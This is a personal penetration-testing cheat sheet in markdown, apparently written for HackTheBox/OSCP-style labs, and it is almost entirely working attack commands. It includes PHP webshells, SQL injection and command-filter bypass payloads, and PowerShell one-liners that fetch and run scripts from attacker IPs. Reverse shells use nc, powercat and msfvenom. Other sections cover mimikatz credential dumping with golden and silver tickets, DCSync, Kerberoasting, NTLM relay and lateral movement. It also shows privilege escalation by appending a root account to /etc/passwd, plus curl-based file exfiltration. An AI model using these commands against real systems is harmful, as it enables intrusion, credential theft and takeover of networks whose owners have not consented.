# My Cheet Sheet
- [My Cheet Sheet](#my-cheet-sheet)
- [Port Scan](#port-scan)
  - [rustscan](#rustscan)
  - [nmap](#nmap)
  - [Powershell](#powershell)
- [Recon](#recon)
  - [Autorecon](#autorecon)
  - [SNMP](#snmp)
  - [SMB](#smb)
  - [RPC](#rpc)
  - [Web](#web)
    - [App](#app)
    - [subdomain](#subdomain)
    - [dir](#dir)
    - [WordPress](#wordpress)
    - [endpoint](#endpoint)
- [Initial Access](#initial-access)
  - [Path Traversal](#path-traversal)
    - [id\_sa](#id_sa)
    - [LFI](#lfi)
  - [Webshell](#webshell)
  - [Reverse Shell](#reverse-shell)
    - [Bypass](#bypass)
  - [SQLi](#sqli)
    - [MSSQL](#mssql)
  - [ExploitDB](#exploitdb)
  - [shellcode](#shellcode)
- [Phishing](#phishing)
- [Foothold](#foothold)
  - [Interactiveshell](#interactiveshell)
  - [Windows](#windows-1)
    - [SHELL](#shell)
    - [Client Soft](#client-soft)
- [Credential Access](#credential-access)
  - [Brute Force](#brute-force)
  - [hashcrack](#hashcrack)
  - [Windows](#windows-2)
    - [crackmap](#crackmap)
    - [kerbrute](#kerbrute)
    - [mimikatz](#mimikatz)
    - [AD](#ad)
- [Lateral Movement](#lateral-movement)
  - [NTLM Relay](#ntlm-relay)
  - [PsExec](#psexec)
  - [WMI winRM](#wmi-winrm)
  - [DCOM](#dcom)
  - [RunasCs](#runascs)
- [Discovery](#discovery)
  - [Windows](#windows-3)
    - [PowerView](#powerview)
    - [winPEAS](#winpeas)
    - [Powerless](#powerless)
    - [token](#token)
    - [Sherlock](#sherlock)
    - [PrivescCheck](#privesccheck)
    - [BloodHound](#bloodhound)
  - [Linux](#linux-1)
    - [cmd](#cmd)
    - [linpeas](#linpeas)
    - [pspy](#pspy)
- [Privilege Escalation](#privilege-escalation)
  - [Windows](#windows-4)
    - [PowerUp](#powerup)
    - [SharpUp](#sharpup)
    - [LOLBIN](#lolbin)
    - [token](#token-1)
    - [S4U](#s4u)
    - [ADCS](#adcs)
  - [Linux](#linux-2)
    - [SUGGEST](#suggest)
    - [/etc/passwd](#etcpasswd)
- [Transfer](#transfer)
  - [Port Forwading](#port-forwading)
    - [SSH](#ssh)
    - [Chisel](#chisel)
  - [SMB](#smb-1)
  - [FTP](#ftp)
- [HTTP](#http)
- [Tips](#tips)
  - [list](#list)
  - [Metasploit](#metasploit)


# Port Scan
## rustscan
```bash
rustscan -a <IP> --top --ulimit 5000
```
## nmap
```bash
# IP-Sweep
nmap -sn -v 192.168.50.1-253 -oG ping-sweep.txt

# TCP
nmap -sT -n -Pn -v -A
nmap -sT -n -Pn -v --top-ports 1000 -A 192.168.50.1-254 
nmap -sT -n -Pn -v -p-
# UDP
nmap -sU -n -Pn -v <IP>

# SMB
# help /usr/share/nmap/scripts
nmap -p 139,445 -n -Pn --script smb-protocols,smb-os-discovery,smb-enum-shares,smb-enum-users,smb-enum-services 10.10.11.158
nmap -p 139,445 -n -Pn --script smb-vuln-ms17-010,smb-vuln-cve-2017-7494,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos,smb-vuln-webexec 10.10.10.40

# SMTP
nmap -p 25 --script smtp-enum-users,smtp-commands,smtp-ntlm-info
#POP3
nmap -p 110 --script pop3-capabilities,pop3-ntlm-info 

# LDAP
nmap -p 389 -n -Pn --script ldap-rootdse

# vuln
nmap -n -Pn --script vuln 10.10.10.248
```
## Powershell
```powershell
# on powershell
1..8000 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.221.151", $_)) "TCP port $_ is open"} 2>$null
```

# Recon
## Autorecon
```bash
source /opt/autorecon/bin/activate
autorecon <CIDR>
```

## SNMP
```bash
# https://github.com/SECFORCE/SNMP-Brute/blob/master/snmpbrute.py
python3 snmpbrute.py -t 10.10.11.193

# snmpwalk
snmpwalk -c internal -v2c 10.10.11.193 
```

## SMB
```bash
smbclient -N -L \\\\10.129.144.138
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

## RPC
```bash
rpcclient -U '' -N 10.10.11.4

enumdomains
enumdomgroups
lsaquery
querydominfo
enumdomusers
```

## Web
### App
```bash
# nikto
nikto -p 80 -h http://

# whatweb
whatweb -v http://
```
### subdomain
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http:// -H "Host: FUZZ. " -mc all -fs 111
```
### dir
```bash
# ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -e aspx,txt,pdf,html,php -u http:// 
ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -e aspx,txt,pdf,html,php -u http://

# dirsearch
dirsearch -u https://

# gobuster
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -k -x aspx,txt,pdf,html,php -u http://
gobuster dir -w /usr/share/wordlists/dirb/common.txt -k -x aspx,txt,pdf,html,php -u http://

# Dirb
dirb http://
```
### WordPress
```bash
wpscan --url http://192.168.198.244 --enumerate u
wpscan --url http://192.168.198.244 --enumerate p --plugins-detection aggressive  --plugins-version-detection  aggressive
```

### endpoint
```bash
# katana
katana -u http://
```

# Initial Access
https://github.com/swisskyrepo/PayloadsAllTheThings
## Path Traversal
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
```bash
/etc/passwd

/proc/self/cmdline
/proc/1/cwd
/proc/2/environ

/home/offsec/.ssh/id_rsa
/home/offsec/.ssh/authorized_keys

/etc/nginx/nginx.conf
/etc/nginx/modules-enabled/default.conf
/opt/apache2/conf/httpd.conf
/opt/apache/conf/httpd.conf
```
### id_sa
```bash
chmod 400 id_key
ssh -i id_key -p 2222
```
### LFI
```php
# page=...

php://filter/resource=admin.php
php://filter/convert.base64-encode/resource=admin.php

data://text/plain;base64,<base64>&cmd=ls
```
## Webshell
/usr/share/webshells
```php
<?php echo(system($_GET["cmd"])); ?>
<?php echo(shell_exec($_GET["cmd"])); ?>
<?php echo(exec($_GET["cmd"]));?>
```
Wordpress <br/>
https://github.com/p0dalirius/Wordpress-webshell-plugin
## Reverse Shell
https://www.revshells.com/
<br/>
https://tex2e.github.io/reverse-shell-generator/index.html
### Bypass
```bash
w'h'o'am'i
w"h"o"am"i
```
#### Linux
```bash
# /
${PATH:0:1}
${PWD:0:1}
# white
${IFS}
$9
# ;
${LS_COLORS:10:1}
```
#### Windows
```powershell
# \
$env:HOMEPATH[0]

```
## SQLi
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```bash
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //

# colum
' ORDER BY 1-- //
' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```
### MSSQL
#### Inject
```
test' union select 1,@@version,3,4,5,6--
test' union select 1,DB_NAME(),3,4,5,6--
test' union select 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')--
test' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users--
```
#### inLine
https://book.hacktricks.xyz/v/jp/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202

# help
help

# xp_cmdshell
enable_xp_cmdshell

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# NTLM
responder -I tun0

xp_dirtree '\\10.10.14.23\any\thing'

SELECT name FROM master.dbo.sysdatabases;
USE master
exec master.dbo.xp_dirtree '\\10.10.14.23\relay'
EXEC master..xp_subdirs '\\10.10.14.23\anything\'
EXEC master..xp_fileexist '\\10.10.14.23\anything\'
```

## ExploitDB
```bash
searchsploit -m 42031
```
## shellcode
https://shell-storm.org/shellcode/index.html
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python 
```

# Phishing
webdav
```bash
# webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/work/webdav
# sendmail
swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.232.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap  
```
shellter
```bash
shellter
```

# Foothold
## Interactiveshell
```bash
# 仮想tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg 
export TERM=xterm-256col
export SHELL=/bin/bash
reset
```
## Windows
### SHELL
```powershell
#nc.exe
powershell -nop -c "iwr -Uri http://10.10.14.35/nc.exe -Outfile nc.exe"
.\nc.exe 10.10.14.35 4444 -e powershell

# Invoke-PowerShellTcp
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 4444"

# powercat
cd /usr/share/powershell-empire/empire/server/data/module_source/management/
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.185/powercat.ps1');powercat -c 192.168.45.185 -p 4444 -e powershell"

# Unrestricted
powershell -ep bypass
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
```
### Client Soft
```bash
# SMB
impacket-smbclient intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
smbclient -U tyler \\\\test\\share
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234

# psexec
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
# wmiexec
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
# dcomexec
impacket-dcomexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
impacket-dcomexec -object MMC20 active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand
# evil-winrm
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```


# Credential Access
## Brute Force
```bash
# hydra
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337" rdp://192.168.50.202
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:F=Login failed"
```
## hashcrack
```bash
# MD5-RAW: 0, SHA-256: 1400, NTLM: 1000, NetNTLMv2: 5600, AS-REP: 18200, TGS-REP: 13100
hashcat -m 0 -a 0 crackme.txt /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule --force

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --rules /usr/share/john/rules/best64.rule hash.txt
```
## Windows
### crackmap
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
```
### kerbrute
```bash
kerbrute passwordspray ./userlist Password123! -dc 10.10.10.248 -d active.htb 
```
### mimikatz
```powershell
# PTH
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
#PTT
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
.\mimikatz.exe "privilege::debug" "kerberos::ptt c:\ticket\folder" "exit"

# silver ticket
whoami /user
.\mimikatz.exe "kerberos::golden /domain:htb.local /ptt /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:Administrator" "exit"

# golden ticket
whoami /user
.\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /ptt /domain:htb.local /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:cc36cf7a8514893efccd332446158b1a" "exit"

# lsadump
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:htb.local" "exit"
```
### AD
#### AS-REP
```bash
# impacket
impacket-GetNPUsers HTB.local/ -no-pass -dc-ip 10.10.10.161 -usersfile username.txt -format john -outputfile outhash.txt
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete

# Rubeus
.\Rubeus.exe asreproast /nowrap
```
#### Kerberoasting 
```bash
# impacket
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile tgs.hash

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
#### DCsync
```bash
impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm

# SAM
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
```


# Lateral Movement
## NTLM Relay 
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c 
```
## PsExec
```powershell
wget https://download.sysinternals.com/files/PSTools.zip

.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd

# OTH
net use \\files04
.\PsExec64.exe \\PC1 cmd --accepteula
```
## WMI winRM
```powershell
# winrm
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

# winrs 
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e "
```
## DCOM
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e   ","7")
```
## RunasCs
https://github.com/antonioCoco/RunasCs
```powershell
.\RunasCs.exe username password cmd.exe -r 10.10.14.83:7777
```

# Discovery
## Windows
### PowerView
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
```powershell
cd /usr/share/windows-resources/powersploit/Recon/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')

# cmd
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Find-LocalAdminAccess
Get-LocalGroupMember Administrators
Invoke-UserHunter
Get-NetSession -Verbose -ComputerName web04 
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
### winPEAS
```powershell
# on nc.exe
cd /usr/share/peass/winpeas
iwr -Uri http:// -Outfile winPEASany.exe
# on powershell
iwr -Uri http:// -Outfile winPEAS.bat
```
### Powerless
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
```powershell
wget https://raw.githubusercontent.com/gladiatx0r/Powerless/master/Powerless.bat
```
### token
```powershell
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```
### Sherlock
https://github.com/rasta-mouse/Sherlock
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/Sherlock.ps1'); Find-AllVulns
```
### PrivescCheck
https://github.com/itm4n/PrivescCheck
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescCheck.ps1'); Invoke-PrivescCheck
```

### BloodHound
#### Sharphound
```powershell
# Sharphound
cd /usr/lib/bloodhound/resources/app/Collectors/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -Domain htb.local -DomainController 10.10.10.1 -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "Name"

.\SharpHound.exe -c All -d htb.local --domainController 10.10.10.1 -o 

# rusthound
./rusthound_musl -d streamio.htb -i 10.10.11.158 -u 'JDgodd@streamIO.htb' -p 'JDg0dd1s@d0p3cr3@t0r' --ldaps
```
#### neo4j
```bash
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

## Linux
### cmd
```bash
ss -anp
find / -writable -type d 2>/dev/null
find / -iname "*admin*" 2>/dev/null
```
### linpeas
```bash
cd /usr/share/peass/linpeas
```
### pspy
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

# Privilege Escalation
## Windows
### PowerUp
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
```powershell
cd /usr/share/windows-resources/powersploit/Privesc/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1')

# AllChecks
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1'); Invoke-AllChecks

# john Password123!

# Binary Hijacking
Get-ModifiableServiceFile
## AbuseFunction
Install-ServiceBinary -Name ''

# UnquotedService
Get-UnquotedService
## AbuseFunction  
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
### SharpUp
Ghostpack
```powershell
.\SharpUp.exe audit
```
### LOLBIN
```powershell
# Binary Hijacking
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\xampp\mysql\bin\mysqld.exe"
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
net stop mysql
shutdown /r /t 0 

# tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

## Watch
wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
Get-Process -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 20
```
### token
```powershell
# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

# GodPotato
cd /usr/share/windows-resources/binaries/
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.83 9999 -e cmd"

# SharpToken
cd /usr/share/windows-resources/binaries/
.\SharpToken.exe list_token
.\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd true
.\SharpToken.exe add_user admin Abcd1234! Administrators
```
#### Full Power
https://github.com/itm4n/FullPowers
### S4U
https://github.com/Kevin-Robertson/Powermad
<br/>
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Powermad.ps1')

New-MachineAccount -MachineAccount TEST -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose 

Get-DomainComputer TEST

$ComputerSid = Get-DomainComputer TEST -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TEST | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

.\Rubeus.exe hash /user:TEST$ /password:123456 /domain:authority.htb
.\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:svc_ldap /msdsspn:cifs/TEST.authority.htb /ptt
```
### ADCS
```powershell
.\Certify.exe find /vulnerable
.\Certify.exe request /ca:<CA Name> /template:<Template Name> /altname:Administrator

openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced
Cryptographic Provider v1.0" -export -out admin.pfx

.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials /password:
```
#### PassTheCert
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')

wget https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x86/PassTheCert.exe

.\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --add-computer --computer-name <Computer Name>
Get-DomainComputer authority
Get-DomainComputer <Computer Name>
.\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --rbcd --target <CN=DC,OU=Domain Controllers,DC=example,DC=com> --sid <Resource-SID>

impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/DESKTOP-1337$:99U1VOMhRX6LEvISJJQ9PMo07osUJLcp'
impacket-wmiexec -k -no-pass authority.htb/Administrator@authority.authority.htb
```

## Linux
### SUGGEST
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh 
```
###  /etc/passwd
```bash
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g
joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

# Transfer
## Port Forwading
### SSH
```bash
# localport
ssh -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
# l Dynamic
## proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
ssh -D 0.0.0.0:9999 database_admin@10.4.50.215
tail /etc/proxychains4.conf

# remote
ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
# r Dynamic
ssh -R 9998 kali@192.168.118.4
tail /etc/proxychains4.conf
```
#### sshuttle
```bash
sshuttle -r database_admin@192.168.50.63:22 10.4.50.0/24 172.16.50.0/24
```
#### plink
```bash
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```
### Chisel
https://github.com/jpillora/chisel/releases
```bash
./chisel_1.7.5_linux_amd64 server -p 2345 --reverse
chisel.exe client 192.168.45.157:2345 R:80:172.16.118.241:80 R:445:172.16.118.241:445

# Dynamic
./chisel_1.7.5_linux_amd64 server -p 2345 --socks5 --reverse
./chisel_1.7.5_linux_amd64 client 192.168.49.100:2345 R:socks

# tail /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```
## SMB
```bash
impacket-smbserver work /root/work -smb2support

copy  \\192.168.\test.zip
xcopy Win32\* \\FILE04\c$\Windows\Temp\ /s /e
```
## FTP
```bash
# passive mode
passive

# binary mode
bin
# text
ascii
```
# HTTP
https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
```bash
#powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PSUpload.ps1');Invoke-FileUpload -Uri http://10.10.14.37/upload -File 

# linux
python3 -c "import requests;requests.post(\"http://10.10.14.68:8000/upload\",files={\"files\":open(\"/home/lnorgaard/RT30000.zip\",\"rb\")})"
curl -X POST http://10.10.14.68:8000/upload -F 'files=@/home/lnorgaard/RT30000.zip'
```


# Tips
## list
```bash
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
```

## Metasploit
```bash
# hundler
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1234 -f exe -o shell.exe
use multi/handler
# sessions
sessions -l
sessions -i 1

# exploit suggest
use post/multi/recon/local_exploit_suggester

# privesc 
getsystem
migrate 

load kiwi
creds_all
lsa_dump_sam

# Port Forwading
use multi/manage/autoroute

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
jobs

# other
lcd /home/kali/Downloads
lpwd
download 
upload
```